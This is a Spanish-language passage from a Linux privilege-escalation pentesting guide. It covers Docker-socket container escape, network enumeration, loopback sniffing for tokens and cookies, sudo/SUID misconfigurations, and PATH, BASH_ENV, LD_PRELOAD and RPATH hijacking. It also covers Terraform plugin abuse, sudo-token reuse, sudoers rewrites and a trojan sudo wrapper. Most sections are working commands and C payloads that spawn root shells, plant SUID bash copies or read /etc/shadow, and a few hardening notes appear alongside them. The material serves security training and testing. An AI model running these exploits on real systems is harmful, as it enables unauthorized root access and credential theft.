2.  **Create a Container:** Envía una solicitud para crear un container que monte el directorio raíz del sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicia el container recién creado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Usa `socat` para establecer una conexión al container, permitiendo la ejecución de comandos dentro de él.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Después de establecer la conexión con `socat`, puedes ejecutar comandos directamente en el container con acceso de nivel root al sistema de archivos del host.

### Others

Ten en cuenta que si tienes permisos de escritura sobre el docker socket porque estás **inside the group `docker`** tienes [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Si el [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Consulta **más formas de escapar de containers o abusar de container runtimes para escalar privilegios** en:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Si descubres que puedes usar el comando **`ctr`**, lee la siguiente página ya que **puedes ser capaz de abusar de él para escalar privilegios**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Si encuentras que puedes usar el comando **`runc`** lee la siguiente página ya que **puedes ser capaz de abusar de él para escalar privilegios**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus es un sofisticado sistema de Comunicación entre Procesos (IPC) que permite a las aplicaciones interactuar y compartir datos de forma eficiente. Diseñado pensando en el sistema Linux moderno, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.

El sistema es versátil y soporta IPC básico que mejora el intercambio de datos entre procesos, recordando a sockets de dominio UNIX mejorados. Además, ayuda en la difusión de eventos o señales, fomentando la integración fluida entre los componentes del sistema. Por ejemplo, una señal de un daemon de Bluetooth sobre una llamada entrante puede indicar a un reproductor de música que silencie el audio, mejorando la experiencia del usuario. Adicionalmente, D-Bus soporta un sistema de objetos remotos, simplificando peticiones de servicio e invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.

D-Bus opera con un **modelo allow/deny**, gestionando permisos de mensajes (llamadas a métodos, emisión de señales, etc.) en base al efecto acumulado de las reglas de política que coinciden. Estas políticas especifican las interacciones con el bus, pudiendo permitir una escalada de privilegios mediante la explotación de dichos permisos.

Se proporciona un ejemplo de tal política en /etc/dbus-1/system.d/wpa_supplicant.conf, detallando permisos para el usuario root para poseer, enviar y recibir mensajes de fi.w1.wpa_supplicant1.

Las políticas sin un usuario o grupo especificado se aplican de forma universal, mientras que las políticas con contexto "default" se aplican a todos los que no estén cubiertos por otras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprende a enumerar y explotar una comunicación D-Bus aquí:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Red**

Siempre es interesante enumerar la red y averiguar la posición de la máquina.

### Enumeración genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Diagnóstico rápido del filtrado saliente

Si el host puede ejecutar comandos pero los callbacks fallan, separa rápidamente el filtrado de DNS, transporte, proxy y rutas:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Puertos abiertos

Siempre revisa los servicios de red que se están ejecutando en la máquina y con los que no pudiste interactuar antes de acceder a ella:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Clasificar listeners por bind target:

- `0.0.0.0` / `[::]`: expuesto en todas las interfaces locales.
- `127.0.0.1` / `::1`: solo local (buenos tunnel/forward candidates).
- IPs internas específicas (p. ej. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usualmente accesibles solo desde segmentos internos.

### Flujo de triage para servicios solo locales

Cuando comprometes un host, los servicios vinculados a `127.0.0.1` a menudo se vuelven accesibles por primera vez desde tu shell. Un flujo de trabajo local rápido es:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS como escáner de red (modo sólo de red)

Además de local PE checks, linPEAS puede ejecutarse como un escáner de red enfocado. Utiliza binarios disponibles en `$PATH` (típicamente `fping`, `ping`, `nc`, `ncat`) y no instala herramientas.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si pasas `-d`, `-p` o `-i` sin `-t`, linPEAS se comporta como un pure network scanner (omitiendo el resto de los privilege-escalation checks).

### Sniffing

Comprueba si puedes sniff traffic. Si puedes, podrías ser capaz de obtener algunas credentials.
```
timeout 1 tcpdump
```
Comprobaciones prácticas rápidas:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) es especialmente valioso en post-exploitation porque muchos servicios internos exponen allí tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Captura ahora, analiza después:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Usuarios

### Enumeración genérica

Comprueba **who** eres, qué **privileges** tienes, qué **users** hay en los sistemas, cuáles pueden **login** y cuáles tienen **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grande

Algunas versiones de Linux se vieron afectadas por una vulnerabilidad que permite a usuarios con **UID > INT_MAX** escalar privilegios. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupos

Comprueba si eres **miembro de algún grupo** que podría otorgarte privilegios de root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Portapapeles

Comprueba si hay algo interesante en el portapapeles (si es posible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Contraseñas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Contraseñas conocidas

Si **conoces alguna contraseña** del entorno **intenta iniciar sesión como cada usuario** usando esa contraseña.

### Su Brute

Si no te importa generar mucho ruido y los binarios `su` y `timeout` están presentes en el equipo, puedes intentar realizar brute-force sobre usuarios usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con el parámetro `-a` también intenta realizar brute-force sobre usuarios.

## Writable PATH abuses

### $PATH

Si descubres que puedes **escribir dentro de alguna carpeta del $PATH** podrías ser capaz de escalar privilegios **creando una backdoor dentro de la carpeta escribible** con el nombre de algún comando que vaya a ser ejecutado por otro usuario (idealmente root) y que **no se cargue desde una carpeta que esté antes** que tu carpeta escribible en el $PATH.

### SUDO y SUID

Se te podría permitir ejecutar algún comando usando sudo o podrían tener el bit suid. Compruébalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Algunos **comandos inesperados permiten leer y/o escribir archivos o incluso ejecutar un comando.** Por ejemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuración de sudo puede permitir que un usuario ejecute algún comando con los privilegios de otro usuario sin conocer la contraseña.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
En este ejemplo el usuario `demo` puede ejecutar `vim` como `root`; ahora es trivial obtener una shell añadiendo una clave ssh en el directorio `root` o ejecutando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta directiva permite al usuario **establecer una variable de entorno** al ejecutar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este ejemplo, **based on HTB machine Admirer**, estaba **vulnerable** a **PYTHONPATH hijacking** para cargar una biblioteca python arbitraria mientras se ejecutaba el script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservado mediante sudo env_keep → root shell

Si sudoers preserva `BASH_ENV` (por ejemplo, `Defaults env_keep+="ENV BASH_ENV"`), puedes aprovechar el comportamiento de arranque no interactivo de Bash para ejecutar código arbitrario como root al invocar un comando permitido.

- Por qué funciona: Para shells no interactivos, Bash evalúa `$BASH_ENV` y carga ese archivo antes de ejecutar el script objetivo. Muchas reglas de sudo permiten ejecutar un script o un wrapper de shell. Si `BASH_ENV` es preservado por sudo, tu archivo se carga con privilegios de root.

- Requisitos:
- Una regla de sudo que puedas ejecutar (cualquier objetivo que invoque `/bin/bash` de forma no interactiva, o cualquier script de bash).
- `BASH_ENV` presente en `env_keep` (compruébalo con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Eliminar `BASH_ENV` (y `ENV`) de `env_keep`; preferir `env_reset`.
- Evitar wrappers de shell para comandos permitidos por sudo; usar binarios mínimos.
- Considerar el registro I/O y la generación de alertas de sudo cuando se usan variables de entorno preservadas.

### Terraform vía sudo con HOME preservado (!env_reset)

Si sudo deja el entorno intacto (`!env_reset`) mientras permite `terraform apply`, `$HOME` permanece como el usuario que llamó. Por tanto, Terraform carga **$HOME/.terraformrc** como root y respeta `provider_installation.dev_overrides`.

- Apuntar el provider requerido a un directorio escribible y colocar un plugin malicioso con el nombre del provider (p. ej., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform fallará en el Go plugin handshake pero ejecutará el payload como root antes de morir, dejando atrás un SUID shell.

### TF_VAR overrides + symlink validation bypass

Las variables de Terraform pueden proporcionarse mediante variables de entorno `TF_VAR_<name>`, que sobreviven cuando sudo preserva el entorno. Validaciones débiles como `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` pueden ser eludidas con symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resuelve el symlink y copia el real `/root/root.txt` a un destino legible por el atacante. El mismo enfoque puede usarse para **escribir** en rutas privilegiadas creando previamente symlinks de destino (p. ej., apuntando la ruta de destino del provider dentro de `/etc/cron.d/`).

### requiretty / !requiretty

En algunas distribuciones antiguas, sudo puede configurarse con `requiretty`, que obliga a sudo a ejecutarse solo desde un TTY interactivo. Si `!requiretty` está establecido (o la opción está ausente), sudo puede ejecutarse desde contextos no interactivos como reverse shells, cron jobs o scripts.
```bash
Defaults !requiretty
```
Esto no es una vulnerabilidad directa por sí misma, pero amplía las situaciones en las que las reglas de sudo pueden ser abusadas sin necesitar un PTY completo.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` muestra `env_keep+=PATH` o una `secure_path` que contiene entradas escribibles por el atacante (p. ej., `/home/<user>/bin`), cualquier comando relativo dentro del objetivo permitido por sudo puede ser suplantado.

- Requisitos: una regla de sudo (a menudo `NOPASSWD`) que ejecute un script/binario que llame a comandos sin rutas absolutas (`free`, `df`, `ps`, etc.) y una entrada de PATH escribible que se busque primero.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo: eludir rutas de ejecución
**Saltar** para leer otros archivos o usar **symlinks**. Por ejemplo en el archivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si se usa **wildcard** (\*), es aún más fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary sin especificar la ruta del comando

Si el **permiso sudo** se otorga a un único comando **sin especificar la ruta**: _hacker10 ALL= (root) less_ puedes explotarlo cambiando la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica también puede usarse si un binario **suid** **ejecuta otro comando sin especificar la ruta hacia él (siempre verifica con** _**strings**_ **el contenido de un SUID extraño)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binario SUID con ruta al comando

Si el binario **suid** **ejecuta otro comando especificando la ruta**, entonces, puedes intentar **exportar una función** con el nombre del comando que el archivo suid está llamando.

Por ejemplo, si un binario suid invoca _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Entonces, cuando llames al suid binary, esta función se ejecutará

### Script escribible ejecutado por un SUID wrapper

Una misconfiguración común en aplicaciones personalizadas es un wrapper SUID binary propiedad de root que ejecuta un script, mientras que el propio script es escribible por usuarios de bajos privilegios.

Patrón típico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` es escribible, puedes añadir comandos de payload y luego ejecutar el SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Comprobaciones rápidas:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
This attack path is especially common in "maintenance"/"backup" wrappers shipped in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable de entorno **LD_PRELOAD** se usa para especificar una o más bibliotecas compartidas (.so files) que el loader cargará antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). A este proceso se le conoce como preloading de una librería.

Sin embargo, para mantener la seguridad del sistema y evitar que esta característica sea explotada, especialmente con ejecutables **suid/sgid**, el sistema aplica ciertas condiciones:

- El loader ignora **LD_PRELOAD** para ejecutables donde el UID real (_ruid_) no coincide con el UID efectivo (_euid_).
- Para ejecutables con suid/sgid, solo se pre-cargan librerías ubicadas en rutas estándar que también sean suid/sgid.

La escalada de privilegios puede ocurrir si tienes la capacidad de ejecutar comandos con `sudo` y la salida de `sudo -l` incluye la línea **env_keep+=LD_PRELOAD**. Esta configuración permite que la variable de entorno **LD_PRELOAD** persista y sea reconocida incluso cuando los comandos se ejecutan con `sudo`, lo que potencialmente permite la ejecución de código arbitrario con privilegios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Guardar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Luego, **compílalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** ejecutando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similar puede aprovecharse si el atacante controla la variable de entorno **LD_LIBRARY_PATH**, porque controla la ruta donde se van a buscar las bibliotecas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Al encontrar un binario con permisos **SUID** que parece inusual, es buena práctica verificar si está cargando correctamente archivos **.so**. Esto se puede comprobar ejecutando el siguiente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por ejemplo, encontrar un error como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugiere que podría ser explotado.

Para explotarlo, se crea un archivo C, por ejemplo _"/path/to/.config/libcalc.c"_, que contenga el siguiente código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, una vez compilado y ejecutado, tiene como objetivo elevar privilegios manipulando los permisos de archivos y ejecutando una shell con privilegios elevados.

Compila el archivo C anterior en un archivo objeto compartido (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, ejecutar el SUID binary afectado debería desencadenar el exploit, permitiendo un posible compromiso del sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ahora que hemos encontrado un binario SUID que carga una library desde una carpeta en la que podemos escribir, creemos la library en esa carpeta con el nombre necesario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si obtienes un error como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
eso significa que la biblioteca que has generado necesita tener una función llamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) es una lista curada de binarios Unix que pueden ser explotados por un atacante para eludir restricciones de seguridad locales. [**GTFOArgs**](https://gtfoargs.github.io/) es lo mismo pero para casos donde puedes **solo inyectar argumentos** en un comando.

El proyecto recopila funciones legítimas de binarios Unix que pueden ser abusadas para escapar de shells restringidos, escalar o mantener privilegios elevados, transferir archivos, crear bind y reverse shells, y facilitar otras tareas de post-explotación.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si puedes ejecutar `sudo -l` puedes usar la herramienta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para comprobar si encuentra cómo explotar alguna regla de sudo.

### Reutilizando tokens de sudo

En casos donde tienes **acceso sudo** pero no la contraseña, puedes escalar privilegios esperando la ejecución de un comando sudo y luego secuestrando el token de sesión.

Requisitos para escalar privilegios:

- Ya tienes un shell como el usuario "_sampleuser_"
- "_sampleuser_" ha **utilizado `sudo`** para ejecutar algo en los **últimos 15mins** (por defecto esa es la duración del token sudo que nos permite usar `sudo` sin introducir ninguna contraseña)
- `cat /proc/sys/kernel/yama/ptrace_scope` es 0
- `gdb` está accesible (puedes subirlo)

(Puedes activar temporalmente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificando permanentemente `/etc/sysctl.d/10-ptrace.conf` y estableciendo `kernel.yama.ptrace_scope = 0`)

Si se cumplen todos estos requisitos, **puedes escalar privilegios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- El **primer exploit** (`exploit.sh`) creará el binario `activate_sudo_token` en _/tmp_. Puedes usarlo para **activar el token sudo en tu sesión** (no obtendrás automáticamente un shell root, ejecuta `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- El **segundo exploit** (`exploit_v2.sh`) creará una sh shell en _/tmp_ **propiedad de root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- El **tercer exploit** (`exploit_v3.sh`) **creará un sudoers file** que **hará que los sudo tokens sean eternos y permitirá que todos los usuarios usen sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si tienes **permisos de escritura** en la carpeta o sobre cualquiera de los archivos creados dentro de la carpeta puedes usar el binario [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **crear un sudo token para un usuario y PID**.\
Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y tienes una shell como ese usuario con PID 1234, puedes **obtener privilegios sudo** sin necesitar conocer la contraseña haciendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
**Si** puedes **leer** este archivo podrías **obtener información interesante**, y si puedes **escribir** en cualquier archivo podrás **escalar privilegios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si puedes escribir, puedes abusar de este permiso
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Otra forma de abusar de estos permisos:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existen algunas alternativas al binario `sudo`, como `doas` para OpenBSD; recuerda revisar su configuración en `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si sabes que un **usuario suele conectarse a una máquina y usa `sudo`** para escalar privilegios y tienes una shell dentro de ese contexto de usuario, puedes **crear un nuevo ejecutable sudo** que ejecutará tu código como root y después el comando del usuario. Luego, **modifica el $PATH** del contexto de usuario (por ejemplo añadiendo la nueva ruta en .bash_profile) para que cuando el usuario ejecute sudo, se ejecute tu ejecutable sudo.

Ten en cuenta que si el usuario usa una shell diferente (no bash) necesitarás modificar otros archivos para añadir la nueva ruta. Por ejemplo[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puedes encontrar otro ejemplo en [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

O ejecutando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca compartida

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. Estos archivos de configuración **apuntan a otras carpetas** donde se **buscarán** las **librerías**. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
Consulta **cómo explotar esta mala configuración** en la siguiente página:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Al copiar la lib en `/var/tmp/flag15/`, será utilizada por el programa en ese lugar según lo especificado en la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Luego crea una biblioteca maliciosa en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

